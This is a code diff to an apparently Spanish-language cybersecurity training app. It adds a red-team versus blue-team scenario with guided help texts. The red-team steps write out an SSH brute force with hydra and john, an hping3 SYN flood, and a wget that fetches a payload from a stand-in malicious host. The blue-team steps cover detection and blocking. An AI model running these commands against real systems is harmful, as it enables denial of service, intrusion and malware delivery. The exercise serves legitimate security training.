@@ -46,6 +46,10 @@ export const Icon: React.FC<IconProps> = ({ name, className, ...props }) => {
         'binoculars': <><circle cx="15" cy="15" r="3"/><circle cx="9" cy="15" r="3"/><path d="M15 12v-3"/><path d="M9 12v-3"/><path d="m19 12-2-4"/><path d="m5 12 2-4"/></>,
         'file-clock': <><path d="M16 22h2a2 2 0 0 0 2-2V7l-5-5H6a2 2 0 0 0-2 2v3"/><path d="M4 14a6 6 0 1 0 12 0 6 6 0 0 0-12 0Z"/><path d="M10 14.5V12h-1.5"/></>,
         'log-out': <><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" x2="9" y1="12" y2="12"/></>,
+        'bomb': <><circle cx="12" cy="16" r="1"/><path d="M20 12a8 8 0 1 0-16 0"/><path d="M22 8s-1.5 0-3-2c-1.5-2-3-3-3-3"/><path d="m2 8 3-2c1.5-2 3-3 3-3"/></>,
+        'download': <><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></>,
+        'activity': <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>,
+        'file-search': <><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z" /><polyline points="14 2 14 8 20 8" /><circle cx="10.5" cy="13.5" r="2.5" /><path d="M12.5 15.5 15 18" /></>,
     };
 
     return (
@@ -290,6 +294,40 @@ chmod 640 /var/www/html/db_config.php</code></pre>
             </CisoCard>
         </>
     },
+    {
+        id: 'escenario8', icon: 'bomb', color: 'bg-orange-600', title: 'Escenario 8: Furia en la Red (Ataque Combinado)',
+        subtitle: 'Equipo Rojo vs. Equipo Azul',
+        content: <>
+            <CisoCard icon="clipboard-list" title="Situación del Incidente">
+                <p>El portal de acceso público <strong>"PORTAL-WEB"</strong> está bajo un ataque coordinado. El NOC reporta quejas de clientes sobre errores de "Conexión Rechazada" (DoS). Al mismo tiempo, el SIEM dispara una alerta por múltiples intentos de login fallidos contra la cuenta <code>admin</code>.</p>
+                <p>Host del Defensor (Azul): <code>ssh blue-team@PORTAL-WEB</code></p>
+                <p>Host del Atacante (Rojo): <code>pasante-red@soc-valtorix</code></p>
+            </CisoCard>
+            <CisoCard icon="shield" title="MISIÓN EQUIPO AZUL: RESPUESTA Y RECUPERACIÓN">
+                <p><strong>Objetivo:</strong> Identificar, mitigar y recuperarse del ataque.</p>
+                <h5>1. Diagnóstico de Carga (top/htop)</h5>
+                <pre><code>top</code></pre>
+                <h5>2. Análisis de Logs (journalctl)</h5>
+                <pre><code>journalctl -u sshd | grep "Failed password"</code></pre>
+                 <h5>3. Mitigación (Firewall y Fail2Ban)</h5>
+                <pre><code>sudo ufw deny from [IP_ATACANTE]
+sudo fail2ban-client set sshd banip [IP_ATACANTE]</code></pre>
+                <h5>4. Verificación de Integridad (post-brecha)</h5>
+                <pre><code>sha256sum /var/www/html/index.php</code></pre>
+            </CisoCard>
+            <CisoCard icon="sword" title="MISIÓN EQUIPO ROJO: INFILTRACIÓN Y DISRUPCIÓN">
+                <p><strong>Objetivo:</strong> Ganar acceso y causar denegación de servicio.</p>
+                 <h5>1. Cracking de Contraseña (John/Hydra)</h5>
+                <pre><code>john --wordlist=rockyou.txt hash.txt
+hydra -l admin -P wordlist.txt ssh://PORTAL-WEB</code></pre>
+                 <h5>2. Ataque DoS (hping3)</h5>
+                <pre><code>sudo hping3 --flood -S PORTAL-WEB</code></pre>
+                <h5>3. Acceso y "Payload" (wget)</h5>
+                <pre><code>ssh admin@PORTAL-WEB
+wget http://malware-repo.bad/payload.sh</code></pre>
+            </CisoCard>
+        </>
+    },
 ];
 
 export const RESOURCE_MODULES: ResourceModule[] = [
@@ -426,48 +464,53 @@ Ej: <strong class="text-amber-300">help escenario7</strong>
 
 export const RED_TEAM_HELP_TEXT = `<pre class="whitespace-pre-wrap font-mono text-xs">
 <strong class="text-red-400">EQUIPO ROJO - OBJETIVOS Y COMANDOS</strong>
-Use <strong class="text-amber-300">help escenario7</strong> para una guía detallada.
+Use <strong class="text-amber-300">help [id]</strong> para una guía detallada (ej. help escenario8).
 
-Su misión es auditar 'BOVEDA-WEB' para encontrar y explotar vulnerabilidades.
-
-<strong>Fase 1: Reconocimiento (Mapear el objetivo)</strong>
-  <strong class="text-amber-300">nmap -sV -sC BOVEDA-WEB</strong>   - Escanea puertos, servicios y versiones.
-  <strong class="text-amber-300">dirb http://BOVEDA-WEB</strong>     - Busca directorios web ocultos (ej. /admin).
-  <strong class="text-amber-300">curl http://BOVEDA-WEB/db_config.php</strong> - Intenta leer archivos sensibles.
-  <strong class="text-amber-300">nikto -h http://BOVEDA-WEB</strong> - Escáner de vulnerabilidades web.
+<strong>Fase 1: Reconocimiento</strong>
+  <strong class="text-amber-300">nmap [host]</strong>              - Escanea puertos y servicios.
+  <strong class="text-amber-300">dirb http://[host]</strong>       - Busca directorios web ocultos.
+  <strong class="text-amber-300">curl http://[host]/[file]</strong> - Intenta leer archivos sensibles.
+  <strong class="text-amber-300">nikto -h http://[host]</strong>   - Escáner de vulnerabilidades web.
 
 <strong>Fase 2: Intrusión y Explotación</strong>
-  <strong class="text-amber-300">hydra ssh://BOVEDA-WEB</strong>     - Lanza un ataque de fuerza bruta a SSH. <strong class="text-red-500">(¡RUIDOSO!)</strong>
-  <strong class="text-amber-300">ssh root@BOVEDA-WEB</strong>      - Intenta acceder con credenciales encontradas.
+  <strong class="text-amber-300">hydra ssh://[host]</strong>       - Lanza un ataque de fuerza bruta a SSH. <strong class="text-red-500">(¡RUIDOSO!)</strong>
+  <strong class="text-amber-300">john [hash_file]</strong>       - Simula cracking de contraseñas offline.
+  <strong class="text-amber-300">ssh [user]@[host]</strong>      - Intenta acceder con credenciales encontradas.
+  <strong class="text-amber-300">wget [url]</strong>             - (Dentro del host) Descarga un 'payload'.
+
+<strong>Fase 3: Disrupción</strong>
+  <strong class="text-amber-300">hping3 --flood [host]</strong>    - Simula un ataque de Denegación de Servicio (DoS).
 </pre>`;
 
 export const BLUE_TEAM_HELP_TEXT = `<pre class="whitespace-pre-wrap font-mono text-xs">
 <strong class="text-blue-400">EQUIPO AZUL - OBJETIVOS Y COMANDOS</strong>
-Use <strong class="text-amber-300">help escenario7</strong> para una guía detallada.
-
-Su misión es asegurar ("harden") 'BOVEDA-WEB' y detectar al Equipo Rojo.
+Use <strong class="text-amber-300">help [id]</strong> para una guía detallada (ej. help escenario8).
 
 <strong>Fase 1: Conexión y Hardening</strong>
-  <strong class="text-amber-300">ssh blue-team@BOVEDA-WEB</strong>     - Conéctese al servidor para asegurarlo.
-  <strong class="text-amber-300">sudo ufw status</strong>            - Verifica el estado del firewall.
-  <strong class="text-amber-300">sudo ufw allow [ssh|http]</strong>  - Permite servicios esenciales.
-  <strong class="text-amber-300">sudo ufw enable</strong>            - ¡ACTIVA EL FIREWALL!
-  <strong class="text-amber-300">sudo nano sshd_config</strong>      - Simula editar la config de SSH (PermitRootLogin no).
+  <strong class="text-amber-300">ssh blue-team@[host]</strong>     - Conéctese al servidor para asegurarlo.
+  <strong class="text-amber-300">sudo ufw [cmd]</strong>           - Gestiona el firewall (status, enable, allow, deny).
+  <strong class="text-amber-300">sudo nano sshd_config</strong>      - Simula editar la config de SSH.
   <strong class="text-amber-300">sudo systemctl restart sshd</strong>- Aplica los cambios a SSH.
-  <strong class="text-amber-300">ls -l [archivo]</strong>            - Lista permisos de archivos.
-  <strong class="text-amber-300">chmod [perm] [archivo]</strong>     - Cambia permisos de archivos.
+  <strong class="text-amber-300">ls -l [file]</strong>             - Lista permisos de archivos.
+  <strong class="text-amber-300">chmod [perm] [file]</strong>      - Cambia permisos de archivos.
 
 <strong>Fase 2: Monitoreo y Detección</strong>
+  <strong class="text-amber-300">top</strong> / <strong class="text-amber-300">htop</strong>               - Muestra la carga del sistema (Detectar DoS).
   <strong class="text-amber-300">sudo ss -tulnp</strong>               - Muestra servicios escuchando en puertos.
   <strong class="text-amber-300">grep "Failed" auth.log</strong>     - Busca intentos de login fallidos.
-  <strong class="text-amber-300">openssl s_client -connect BOVEDA-WEB:443</strong> - Valida el certificado SSL/TLS.
+  <strong class="text-amber-300">journalctl -u sshd</strong>       - Revisa logs del servicio SSH.
+  <strong class="text-amber-300">openssl s_client -connect [host]:443</strong> - Valida el certificado SSL/TLS.
+
+<strong>Fase 3: Respuesta a Incidentes</strong>
+  <strong class="text-amber-300">fail2ban-client banip [ip]</strong> - Simula un baneo manual de IP.
+  <strong class="text-amber-300">sha256sum [file]</strong>           - Verifica la integridad de un archivo.
 </pre>`;
 
 export const SCENARIO_HELP_TEXTS: { [key: string]: string } = {
   'escenario7': `<pre class="whitespace-pre-wrap font-mono text-xs">
 <strong class="text-yellow-300">GUÍA DETALLADA - ESCENARIO 7: Fortaleza Digital</strong>
 
-Este es un ejercicio práctico de ataque y defensa en tiempo real.
+Este es un ejercicio práctico de ataque y defensa en tiempo real contra <strong class="text-cyan-300">BOVEDA-WEB</strong>.
 
 <strong class="text-blue-400">EQUIPO AZUL (DEFENSOR) - EN TERMINAL 'BOVEDA-WEB'</strong>
 Tu misión es asegurar el servidor ANTES de que el Equipo Rojo encuentre una vulnerabilidad.
@@ -509,5 +552,53 @@ Tu misión es encontrar una ventana de oportunidad antes de que el Equipo Azul l
     <strong class="text-amber-300">dirb http://BOVEDA-WEB</strong>     (Busca directorios. ¿Hay un /backup?)
     <strong class="text-amber-300">curl http://BOVEDA-WEB/db_config.php</strong> (Si los permisos no han sido
                                      corregidos, podrías leer el archivo)
+</pre>`,
+ 'escenario8': `<pre class="whitespace-pre-wrap font-mono text-xs">
+<strong class="text-yellow-300">GUÍA DETALLADA - ESCENARIO 8: Furia en la Red</strong>
+
+Ataque combinado contra <strong class="text-cyan-300">PORTAL-WEB</strong>. El trabajo en equipo y la velocidad son claves.
+
+<strong class="text-blue-400">EQUIPO AZUL (DEFENSOR) - EN TERMINAL 'PORTAL-WEB'</strong>
+Estás bajo un doble ataque. Debes diagnosticar y mitigar ambas amenazas.
+
+1.  <strong>Diagnóstico Inicial:</strong> ¿Qué está pasando?
+    <strong class="text-amber-300">top</strong>                 (El sistema está lento. Verás una carga de CPU del 99%.
+                          Esto indica un posible DoS o un proceso descontrolado).
+    <strong class="text-amber-300">journalctl -u sshd</strong>    (Verás cientos de "Failed password for admin".
+                          Esto es un ataque de fuerza bruta. Anota la IP de origen).
+
+2.  <strong>Mitigación Inmediata:</strong> ¡Detén el sangrado!
+    <strong class="text-amber-300">sudo ufw deny from [IP_ATACANTE]</strong> (Bloquea la IP que encontraste en los
+                                      logs. Esto detendrá AMBOS ataques).
+    <strong class="text-amber-300">fail2ban-client set sshd banip [IP_ATACANTE]</strong> (Alternativa que simula
+                                                    un baneo automático).
+    Vuelve a ejecutar <strong class="text-amber-300">top</strong>. La carga debería normalizarse.
+
+3.  <strong>Análisis Post-Incidente:</strong> ¿Lograron entrar?
+    <strong class="text-amber-300">sha256sum /var/www/html/index.php</strong> (Verifica la integridad del archivo.
+                                        Si el Equipo Rojo tuvo éxito, verás una alerta
+                                        de que el hash no coincide).
+
+<strong class="text-red-400">EQUIPO ROJO (ATACANTE) - EN TERMINAL 'soc-valtorix'</strong>
+Tu misión es multifacética: distraer, infiltrar y desplegar.
+
+1.  <strong>Fase de Distracción (DoS):</strong> Crea caos.
+    <strong class="text-amber-300">hping3 --flood -S PORTAL-WEB</strong> (Lanza un SYN flood. Esto hará que el servidor
+                                   se vuelva lento y alertará al Equipo Azul,
+                                   dándote cobertura para el siguiente paso).
+
+2.  <strong>Fase de Infiltración (Fuerza Bruta):</strong>
+    Mientras el DoS está activo, abre otra ventana (mentalmente) y lanza:
+    <strong class="text-amber-300">hydra -l admin -P wordlist.txt ssh://PORTAL-WEB</strong>
+    (Este ataque encontrará la contraseña. Si el Equipo Azul te bloquea
+    la IP, ambos ataques fallarán).
+
+3.  <strong>Acceso y "Payload":</strong>
+    Si obtuviste la contraseña antes de ser bloqueado:
+    <strong class="text-amber-300">ssh admin@PORTAL-WEB</strong> (Usa la contraseña encontrada).
+    Una vez dentro, simula el despliegue de un payload:
+    <strong class="text-amber-300">wget http://malware-repo.bad/payload.sh</strong>
+
+El ejercicio termina cuando el Equipo Azul bloquea tu IP o cuando despliegas el payload.
 </pre>`
 };
